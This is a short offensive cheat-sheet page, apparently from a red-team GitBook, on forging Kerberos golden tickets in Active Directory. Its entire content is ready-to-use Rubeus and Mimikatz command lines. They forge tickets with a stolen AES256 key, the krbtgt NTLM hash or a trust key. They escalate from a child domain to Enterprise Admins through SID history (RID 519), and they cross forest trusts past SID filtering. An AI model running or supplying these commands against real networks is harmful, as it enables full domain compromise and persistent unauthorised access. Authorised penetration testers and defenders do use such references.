---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/steal-or-forge-kerberos-tickets/golden-ticket
---

# Golden Ticket

```powershell
# Rubeus
Rubeus.exe golden /aes256:AES256_Key /user:administrator /domain:vulnableone.local /sid:$SID /ptt /nowrap

# Mimikatz 
# Krbtgt Parent-Child Enterprise Admins - 519
mimikatz.exe "kerberos::golden /user:administrator /domain:child.vulnableone.local /sid:$SID /krbtgt:$krbtgt_NTLM /sids:$SID_Target-519 /ptt" "exit"

# TrustKey Parent-Child Enterprise Admins - 519
mimikatz.exe "kerberos::golden /domain:child.vulnableone.local /sid:$SID /sids:$SID_Target-519 /rc4:$Trust_NTLM /user:Administrator /service:krbtgt /target:vulnableone.local /ptt" "exit"

# Cross Forest aware of SID filtering
mimikatz.exe "kerberos::golden /user:administrator /domain:vulnableone.local /sid:$SID /krbtgt:$krbtgt_NTLM /sids:$SID-1106 /ptt" "exit"
```
